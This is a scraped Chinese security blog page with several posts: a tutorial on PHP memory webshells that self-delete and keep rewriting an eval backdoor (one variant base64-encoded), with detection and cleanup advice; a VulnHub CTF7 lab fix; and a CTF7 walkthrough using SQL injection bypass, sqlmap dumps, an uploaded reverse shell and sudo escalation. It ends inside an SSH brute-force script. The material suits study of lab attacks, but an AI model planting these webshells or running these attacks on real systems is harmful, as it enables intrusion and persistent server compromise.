<p><img src="/images/image-20240321195820376.png" alt="image-20240321195820376">i</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/22/tools-Chrome-OldVersion/" data-id="clu6lf1gw000aa2vd63eh0l1c" data-title="tools-Chrome-OldVersion" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-program-PHP-Memory-Trojan" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/21/program-PHP-Memory-Trojan/" class="article-date">
  <time class="dt-published" datetime="2024-03-21T09:21:03.000Z" itemprop="datePublished">2024-03-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/21/program-PHP-Memory-Trojan/">program-PHP-Memory-Trojan</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="PHP内存马"><a href="#PHP内存马" class="headerlink" title="PHP内存马"></a>PHP内存马</h1><h2 id="0-内存马概念"><a href="#0-内存马概念" class="headerlink" title="0. 内存马概念"></a>0. 内存马概念</h2><p>​	内存马是无文件攻击的一种常用手段，利用中间件的进程执行某些恶意代码。所谓的不死马，其实就是直接用代码弄一个死循环，强占一个 PHP 进程，并不间断的写一个PHP shell，或者执行一段代码</p>
<h2 id="1-内存马剖析"><a href="#1-内存马剖析" class="headerlink" title="1. 内存马剖析"></a>1. 内存马剖析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="variable">$content</span> = <span class="string">&#x27;&lt;?php @eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;index.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">		<span class="title function_ invoke__">usleep</span>(<span class="number">10000</span>);</span><br><span class="line">	&#125;	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<ul>
<li>set_time_limit()函数：设置允许脚本运行的时间，单位为秒（如果设置该运行时间，sleep()函数在执行程序时的持续时间将会被忽略掉）</li>
<li>ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行（如果设置为True，则忽略与用户的断开）</li>
<li>unlink(__FILE__)函数：删除文件（防止文件落地被检测工具查杀）</li>
<li>file_put_contents函数：将一个字符串写入该文件中</li>
<li>usleep函数：延迟执行当前脚本数微秒，即条件竞争</li>
</ul>
<h3 id="1-1-unlink-FILE"><a href="#1-1-unlink-FILE" class="headerlink" title="1.1 unlink(__FILE__)"></a>1.1 unlink(__FILE__)</h3><p>​	在PHP中，<code>unlink(__FILE__)</code> 是一个用于删除当前文件的函数调用。<code>__FILE__</code> 是一个常量，存储了当前文件的绝对路径和文件名。当执行 <code>unlink(__FILE__)</code> 时，它会尝试删除包含这个代码的文件。换句话说，它会删除当前正在执行的 PHP 文件。这个函数的作用类似于在操作系统中手动删除一个文件。</p>
<p>​	需要特别注意的是，执行 <code>unlink(__FILE__)</code> 并不会删除正在运行的 PHP 脚本本身，因为脚本在执行过程中已经被加载到内存中。相反，它会<strong>删除磁盘上的文件</strong>，如果文件正在被其他进程使用，删除操作可能会失败。</p>
<h2 id="2-内存马可用性与存活性验证"><a href="#2-内存马可用性与存活性验证" class="headerlink" title="2. 内存马可用性与存活性验证"></a>2. 内存马可用性与存活性验证</h2><p>​	访问内存马地址(这里我是在本地的8080端口开放的服务) ”<a target="_blank" rel="noopener" href="http://localhost:8080/test.php%E2%80%9C%EF%BC%8C%E5%8F%91%E7%8E%B0%E9%A1%B5%E9%9D%A2%E5%BC%80%E5%A7%8B%E5%8A%A0%E8%BD%BD%E3%80%82%E8%AE%BF%E9%97%AE%E5%86%85%E5%AD%98%E9%A9%AC%E9%87%8A%E6%94%BE%E7%9A%84%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6index.php%E5%B9%B6%E6%89%A7%E8%A1%8Cphpinfo%E5%87%BD%E6%95%B0%E5%8F%91%E7%8E%B0%E6%89%A7%E8%A1%8C%E6%88%90%E5%8A%9F">http://localhost:8080/test.php“，发现页面开始加载。访问内存马释放的后门文件index.php并执行phpinfo函数发现执行成功</a></p>
<p><img src="/images/image-20240321150609522.png" alt="image-20240321150609522"></p>
<p>​	每次执行都会创建一个新的进程用于执行内存马</p>
<h2 id="3-优化PHP内存马"><a href="#3-优化PHP内存马" class="headerlink" title="3. 优化PHP内存马"></a>3. 优化PHP内存马</h2><p>​	传统的不死马并没有判断文件是否存在就写马这样会比较占用服务器资源</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">	<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$file</span> = <span class="string">&#x27;./shell.php&#x27;</span>;</span><br><span class="line">	<span class="comment">// &lt;?php @eval($_GET[&#x27;cmd&#x27;]);?&gt;</span></span><br><span class="line">	<span class="variable">$code</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg==&#x27;</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">true</span>) &#123;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>)) === <span class="title function_ invoke__">md5</span>(<span class="variable">$code</span>))&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>使用md5加密算法判断文件是否被修改，通过file_get_contents判断文件是否存在</strong></p>
<h2 id="4-PHP-内存马在Linux上的表现"><a href="#4-PHP-内存马在Linux上的表现" class="headerlink" title="4. PHP 内存马在Linux上的表现"></a>4. PHP 内存马在Linux上的表现</h2><p>​	要想实现在Linux上注入内存马，需要执行PHP的用户具有写(write)权限</p>
<p>​	访问一次PHP内存马后可以很清楚的看到apache2启动的进程会多出一条，用于处理内存马的运行</p>
<p><img src="/images/image-20240321170010699.png" alt="image-20240321170010699"></p>
<h2 id="5-PHP内存马的排查"><a href="#5-PHP内存马的排查" class="headerlink" title="5. PHP内存马的排查"></a>5. PHP内存马的排查</h2><ol>
<li>先判断是通过什么方法注入的内存马，可以先查看web日志是否<strong>有可疑的web访问日志</strong>，如果是filter或者listener类型就会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的，查看是否有类似哥斯拉、冰蝎相同的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。通过查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马</li>
<li>如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看<strong>是否有可疑的报错</strong>，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞</li>
</ol>
<p>​	也可以通过以下几个方式简单进行排查：</p>
<ul>
<li><p>检查所有php进程处理请求的持续时间</p>
</li>
<li><p>检测执行文件是否在文件系统真实存在</p>
</li>
<li><p>检测该文件的进程状态</p>
</li>
<li><p>检测关闭后还在运行的进行</p>
</li>
</ul>
<h2 id="6-PHP不死马防御"><a href="#6-PHP不死马防御" class="headerlink" title="6. PHP不死马防御"></a>6. PHP不死马防御</h2><h3 id="6-1-有效解决方案"><a href="#6-1-有效解决方案" class="headerlink" title="6.1 有效解决方案"></a>6.1 有效解决方案</h3><ul>
<li><p>不死马运行在中间件的为程序开辟的内存中，只要重启自己的Apache或者Nginx等中间件服务，将不会再生成了</p>
</li>
<li><p>使用命令删除进程，kill掉用户所有子程序</p>
</li>
<li><p>ps命令列举出所有运行人员为可疑使用者(如www-data)的程序pid，然后依次kill</p>
</li>
<li><p>pgrep -u参数查出可疑使用者(如www-data)的程序所有pid，然后依次kill</p>
</li>
</ul>
<h3 id="6-2-临时解决方案"><a href="#6-2-临时解决方案" class="headerlink" title="6.2 临时解决方案"></a>6.2 临时解决方案</h3><ul>
<li>在有生成木马的目录创建.htaccess(apache局部文件夹管理文件)将不死马解析为不可知性的文件</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">shell.php</span>&quot;&gt;</span>SetHandler application/x-httpd-html<span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>创建一个和不死马生成的马一样名字的目录</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">针对的是创建不死马有时间间隔，如用sleep函数</span><br></pre></td></tr></table></figure>

<ul>
<li>利用条件竞争删除不死马文件</li>
</ul>
<p>编写一个使用ignore_user_abort(true)函数的脚本，一直竞争写入删除不死马文件，其中usleep()的时间必须要小于不死马的usleep()时间才会有效果。简单示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;  </span><br><span class="line">        <span class="variable">$pid</span> = 不死马的进程PID;  </span><br><span class="line">        @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;.ski12.php&quot;</span>);  </span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&quot;kill -9 <span class="subst">$pid</span>&quot;</span>);  </span><br><span class="line">     	<span class="title function_ invoke__">usleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/21/program-PHP-Memory-Trojan/" data-id="clu6lf1gd0001a2vd5xzg6mc9" data-title="program-PHP-Memory-Trojan" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-vulnhub-LAMPSecurity-CTF7-initial-error" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/21/vulnhub-LAMPSecurity-CTF7-initial-error/" class="article-date">
  <time class="dt-published" datetime="2024-03-21T04:27:36.000Z" itemprop="datePublished">2024-03-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/21/vulnhub-LAMPSecurity-CTF7-initial-error/">vulnhub-LAMPSecurity-CTF7-initial-error</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CTF7靶机初始化"><a href="#CTF7靶机初始化" class="headerlink" title="CTF7靶机初始化"></a>CTF7靶机初始化</h1><p>​	解压缩CTF7plusDocs.zip后，部署完靶机环境，进入kali 使用netdiscover进行搜索时发现在同一网段下的CTF7靶机，发现并没有有效IP生成</p>
<p>​	尝试通过登录靶机解决问题:</p>
<p><strong>进入CTF7系统                                账户:root                密码:root55pass</strong></p>
<h2 id="1-故障诊断"><a href="#1-故障诊断" class="headerlink" title="1. 故障诊断"></a>1. 故障诊断</h2><p>​	使用 <code>ip a</code> 查看当前网络信息，发现当前网络设备eth1并未获取到正确的IPv4地址 </p>
<p><img src="/images/image-20240321095804407.png" alt="image-20240321095804407"></p>
<p>​	尝试重启网卡</p>
<blockquote>
<p>service network restart</p>
</blockquote>
<p><img src="/images/image-20240321095828804.png" alt="image-20240321095828804"></p>
<p>​	结果出现以下问题：</p>
<blockquote>
<h3 id="Bringing-up-interface-eth0-Device-eth0-does-not-seem-to-be-present-delaying-initialization"><a href="#Bringing-up-interface-eth0-Device-eth0-does-not-seem-to-be-present-delaying-initialization" class="headerlink" title="Bringing up interface eth0: Device eth0 does not seem to be present,delaying initialization"></a>Bringing up interface eth0: Device eth0 does not seem to be present,delaying initialization</h3></blockquote>
<p>​	判断可能是网卡配置文件出现了问题</p>
<h2 id="2-故障修复"><a href="#2-故障修复" class="headerlink" title="2. 故障修复"></a>2. 故障修复</h2><h3 id="2-1-删除持久化网络设备配置文件"><a href="#2-1-删除持久化网络设备配置文件" class="headerlink" title="2.1 删除持久化网络设备配置文件"></a>2.1 删除持久化网络设备配置文件</h3><blockquote>
<p>rm -rf &#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;70-persistent-net.rules</p>
</blockquote>
<h3 id="2-2-编辑本地的网卡配置文件"><a href="#2-2-编辑本地的网卡配置文件" class="headerlink" title="2.2 编辑本地的网卡配置文件"></a>2.2 编辑本地的网卡配置文件</h3><blockquote>
<p>vi &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0</p>
</blockquote>
<p><img src="/images/image-20240321100132662.png" alt="image-20240321100132662"></p>
<ul>
<li>查看 DEVICE，若是device&#x3D;”eth1”修改为device&#x3D;”eth0”</li>
<li>删除 UUID 字段</li>
<li>删除 HWADDR 字段</li>
</ul>
<p>​	然后重启reboot。</p>
<p>​	重启完成再次进行 <code>ip -a</code> 查看：</p>
<p><img src="/images/image-20240321100401885.png" alt="image-20240321100401885"></p>
<p>​	成功获取到IP地址</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-initial-error/" data-id="clu6lf1hi000qa2vdgfkk0z1v" data-title="vulnhub-LAMPSecurity-CTF7-initial-error" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/error/" rel="tag">error</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-vulnhub-LAMPSecurity-CTF7" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/21/vulnhub-LAMPSecurity-CTF7/" class="article-date">
  <time class="dt-published" datetime="2024-03-21T04:27:28.000Z" itemprop="datePublished">2024-03-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/21/vulnhub-LAMPSecurity-CTF7/">vulnhub-LAMPSecurity-CTF7</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[TOC]</p>
<h1 id="CTF7靶机"><a href="#CTF7靶机" class="headerlink" title="CTF7靶机"></a>CTF7靶机</h1><h2 id="0-环境配置"><a href="#0-环境配置" class="headerlink" title="0. 环境配置"></a>0. 环境配置</h2><table>
<thead>
<tr>
<th>主机</th>
<th>IP</th>
</tr>
</thead>
<tbody><tr>
<td>攻击机</td>
<td>192.168.134.1</td>
</tr>
<tr>
<td>靶机</td>
<td>192.168.134.152</td>
</tr>
</tbody></table>
<h2 id="1-netdiscover-同段主机存活主机探测"><a href="#1-netdiscover-同段主机存活主机探测" class="headerlink" title="1. netdiscover 同段主机存活主机探测"></a>1. netdiscover 同段主机存活主机探测</h2><blockquote>
<p>sudo netdiscover -i eth0 -r 192.168.134.0&#x2F;24</p>
</blockquote>
<p><img src="/images/image-20230323104109088.png" alt="image-20230323104109088"></p>
<h2 id="2-Nmap主机开放服务探测"><a href="#2-Nmap主机开放服务探测" class="headerlink" title="2. Nmap主机开放服务探测"></a>2. Nmap主机开放服务探测</h2><h3 id="2-1-mini-rate-快速探测主机开放服务"><a href="#2-1-mini-rate-快速探测主机开放服务" class="headerlink" title="2.1  mini-rate 快速探测主机开放服务"></a>2.1  mini-rate 快速探测主机开放服务</h3><blockquote>
<p>sudo nmap –min-rate 10000 -p- -Pn 192.168.134.154</p>
</blockquote>
<p><img src="/images/image-20230323104254505.png" alt="image-20230323104254505"></p>
<p>​	可以看出当前靶场开放较多端口，这里的话重点关注22、80、5900、8080</p>
<h3 id="2-2-TCP服务开放性探测"><a href="#2-2-TCP服务开放性探测" class="headerlink" title="2.2 TCP服务开放性探测"></a>2.2 TCP服务开放性探测</h3><blockquote>
<p>sudo nmap -sT -sV -sC -O -p 22,80,137,138,139,901,5900,8080,10000 192.168.134.154</p>
</blockquote>
<p><img src="/images/1679539633057.png" alt="1679539633057"></p>
<p>​	可以发现在 8080 端口处存在一个 <code>/login.php</code> 的登录功能点</p>
<h3 id="2-3-UDP服务开放性探测"><a href="#2-3-UDP服务开放性探测" class="headerlink" title="2.3 UDP服务开放性探测"></a>2.3 UDP服务开放性探测</h3><blockquote>
<p>sudo nmap –min-rate 10000 -p- sU -v 192.168.134.154</p>
</blockquote>
<p><img src="/images/image-20230323104626260.png" alt="image-20230323104626260"></p>
<h3 id="2-4-服务端vuln脚本探测"><a href="#2-4-服务端vuln脚本探测" class="headerlink" title="2.4 服务端vuln脚本探测"></a>2.4 服务端vuln脚本探测</h3><blockquote>
<p>sudo nmap –script&#x3D;vuln -p 22,80,137,138,139,901,5900,8080,10000 192.168.134.154</p>
</blockquote>
<p><img src="/images/image-20230323105141750.png" alt="image-20230323105141750"></p>
<h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3. 渗透测试"></a>3. 渗透测试</h2><h3 id="3-1-根据Nmap扫描结果，对8080端口admin后台登录界面进行测试"><a href="#3-1-根据Nmap扫描结果，对8080端口admin后台登录界面进行测试" class="headerlink" title="3.1 根据Nmap扫描结果，对8080端口admin后台登录界面进行测试"></a>3.1 根据Nmap扫描结果，对8080端口admin后台登录界面进行测试</h3><p>​		通过前面的资产扫面可以发现在8080端口下存在一个后台登陆界面，简单的来个SQL注入测试</p>
<p><img src="/images/image-20230323110553762.png" alt="image-20230323110553762"></p>
<h3 id="3-2-万能密码登录Admin后台-SQL注入"><a href="#3-2-万能密码登录Admin后台-SQL注入" class="headerlink" title="3.2 万能密码登录Admin后台&#x2F;SQL注入"></a>3.2 万能密码登录Admin后台&#x2F;SQL注入</h3><p>​	在username和password框中各输入一个引号，放包观察页面内容</p>
<p><img src="/images/image-20240321102646131.png" alt="image-20240321102646131"></p>
<p>​	页面回显异常:</p>
<blockquote>
<p>Invalid query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘admin’’) and is_admin&#x3D;1’ at line 1 Whole query: select * from users where username&#x3D;’admin’’ AND password&#x3D;md5(‘admin’’) and is_admin&#x3D;1</p>
</blockquote>
<p><img src="/images/image-20230323111254165.png" alt="image-20230323111254165"></p>
<p>​		说明在登陆端口处存在SQL注入，并且发现当前的SQL语句为:select * from users where username&#x3D;’’ AND password&#x3D;md5(‘’) and is_admin&#x3D;1</p>
<p>​		</p>
<h4 id="3-2-1-万能密码登录Admin后台"><a href="#3-2-1-万能密码登录Admin后台" class="headerlink" title="3.2.1 万能密码登录Admin后台"></a>3.2.1 万能密码登录Admin后台</h4><p>​	我们尝试使用万能密码进行登录</p>
<blockquote>
<p>用户名：admin’ or 1&#x3D;1 – wq</p>
<p>密码：admin’) or 1&#x3D;1 – wq</p>
</blockquote>
<p><img src="/images/image-20230323111402750.png" alt="image-20230323111402750"></p>
<p>​		成功登录站点后台 <code>http://192.168.70.197:8080/index.php</code></p>
<p><img src="/images/image-20230323111419988.png" alt="image-20230323111419988"></p>
<h4 id="3-2-2-sqlmap后台数据获取"><a href="#3-2-2-sqlmap后台数据获取" class="headerlink" title="3.2.2 sqlmap后台数据获取"></a>3.2.2 sqlmap后台数据获取</h4><p>​	在8080端口SQL注入处使用sqlmap脱下所有的数据看看</p>
<blockquote>
<p>sqlmap -r login.txt –banner </p>
<p>sqlmap -r login.txt –dbms mysql –dbs</p>
<h3 id="roundcube-库中的user表单数据查询"><a href="#roundcube-库中的user表单数据查询" class="headerlink" title="roundcube 库中的user表单数据查询"></a>roundcube 库中的user表单数据查询</h3><p>sqlmap -r login.txt –dbms mysql -D roundcube –tables</p>
<p>sqlmap -r login.txt –dbms mysql -D roundcube -T users –dump</p>
<h3 id="website-库中的user表单数据查询"><a href="#website-库中的user表单数据查询" class="headerlink" title="website 库中的user表单数据查询"></a>website 库中的user表单数据查询</h3><p>sqlmap -r login.txt –dbms mysql -D website –tables</p>
<p>sqlmap -r login.txt –dbms mysql -D website -T users –dump</p>
</blockquote>
<p><img src="/images/image-20230323111908460.png" alt="image-20230323111908460"></p>
<p><img src="/images/image-20230323111956185.png" alt="image-20230323111956185"></p>
<p><img src="/images/image-20230323112059019.png" alt="image-20230323112059019"></p>
<p><img src="/images/image-20230323112114743.png" alt="image-20230323112114743"></p>
<p>​		可以发现roundcube库中的user表单中不存在能够利用的数据</p>
<p><img src="/images/image-20230323112932532.png" alt="image-20230323112932532"></p>
<h3 id="3-4-路径爆破"><a href="#3-4-路径爆破" class="headerlink" title="3.4 路径爆破"></a>3.4 路径爆破</h3><p>​	因为服务器端开放22端口，对上面获取到的账号密码尝试使用ssh密码喷射，但是都无法登录SSH，这时候我们只能重新对资产进行一波信息搜集</p>
<p>​	这里尝试对80端口服务进行探测</p>
<p><img src="/images/image-20230323131205788.png" alt="image-20230323131205788"></p>
<p>​	这里我们发现了一个很有趣的文件目录<code>/assets</code>，这个目录存放了一些文件，尝试访问可以发现是一对图标文件</p>
<p><img src="/images/image-20240321103323615.png" alt="image-20240321103323615"></p>
<p>​	猜测这个文件夹可能是用于存放上传资源的路径，这时就需要去查找相关上传点。</p>
<p>​	经过测试发现可以在<code>http://192.168.70.197:8080/readings.php</code>(管理员界面推广的Reading读物的预览)界面上传文件至<code>http://192.168.70.197/assets</code>，那么就可以尝试我们去提交一个恶意文件，然后尝试获取链接</p>
<p><img src="/images/image-20230323131503469.png" alt="image-20230323131503469"></p>
<p><img src="/images/image-20230323131449824.png" alt="image-20230323131449824"></p>
<h3 id="3-5-文件上传GetShell"><a href="#3-5-文件上传GetShell" class="headerlink" title="3.5 文件上传GetShell"></a>3.5 文件上传GetShell</h3><p>​	使用msfvenom创建一个PHP的反弹shell文件，保存并命名为hack.php</p>
<p><img src="/images/image-20230323131420290.png" alt="image-20230323131420290"></p>
<p>​	将文件通过<code>Add a new Readings</code>上传至<code>/assets</code>文件夹目录</p>
<p><img src="/images/image-20230323131522965.png" alt="image-20230323131522965"></p>
<p>​	访问 <code>http://192.168.70.197/assets</code> 成功将木马文件上传至指定地点</p>
<p><img src="/images/image-20230323131533810.png" alt="image-20230323131533810"></p>
<h3 id="3-6-建立通信隧道链接"><a href="#3-6-建立通信隧道链接" class="headerlink" title="3.6 建立通信隧道链接"></a>3.6 建立通信隧道链接</h3><p>​		打开msfconsole，建立监听隧道</p>
<p><img src="/images/image-20230323131630163.png" alt="image-20230323131630163"></p>
<p>​		访问恶意文件，成功反弹shell</p>
<p><img src="/images/image-20230323131711399.png" alt="image-20230323131711399"></p>
<p><img src="/images/image-20230323131718925.png" alt="image-20230323131718925"></p>
<h3 id="3-7-用户提权"><a href="#3-7-用户提权" class="headerlink" title="3.7 用户提权"></a>3.7 用户提权</h3><p>​		一开始获得的用户权限是<code>apache</code>，这个权限无法执行任何操作。这时候我们就需要获取更高权限的用户，首先想到的是<code>/home</code>文件夹下存在几个和我们爆出的数据库用户名同名的文件夹，我们分别切换到这些账号中，发现能够顺利切换用户</p>
<p><img src="/images/image-20230323132518344.png" alt="image-20230323132518344"></p>
<p>​		但是其他几个用户都没有权限，无法执行sudo提权</p>
<p><img src="/images/image-20230323141156139.png" alt="image-20230323141156139"></p>
<p>​		最后经过测试只有第一个brian用户才拥有所有命令的执行权限，那么就通过</p>
<blockquote>
<p>sudo &#x2F;bin&#x2F;bash </p>
</blockquote>
<p>获取一个root权限的shell对话框</p>
<p><img src="/images/image-20230323141126102.png" alt="image-20230323141126102"></p>
<p><img src="/images/1679551930000.png" alt="1679551930000"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7/" data-id="clu6lf1hj000ra2vd68wchrnl" data-title="vulnhub-LAMPSecurity-CTF7" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-vulnhub-LAMPSecurity-CTF7-external" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/" class="article-date">
  <time class="dt-published" datetime="2024-03-21T04:27:24.000Z" itemprop="datePublished">2024-03-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/">vulnhub-LAMPSecurity-CTF7-external</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CTF7靶机探索"><a href="#CTF7靶机探索" class="headerlink" title="CTF7靶机探索"></a>CTF7靶机探索</h1><h2 id="1-SSH-root-用户弱口令"><a href="#1-SSH-root-用户弱口令" class="headerlink" title="1. SSH root 用户弱口令"></a>1. SSH root 用户弱口令</h2><p>​	编写一个简单的SSH弱口令爆破程序</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pass.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    password_lists = f.read().split()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;user.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    user_lists = f.read().split()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> user_lists:</span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> password_lists:</span><br><span class="line">        cmd = <span class="string">&quot;sshpass -p &#123;&#125; ssh &#123;&#125;@192.168.70.197 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -oCiphers=+3des-cbc&quot;</span>.<span class="built_in">format</span>(password, user)</span><br><span class="line">        res = os.system(cmd)</span><br><span class="line">        <span class="keyword">if</span> res != <span 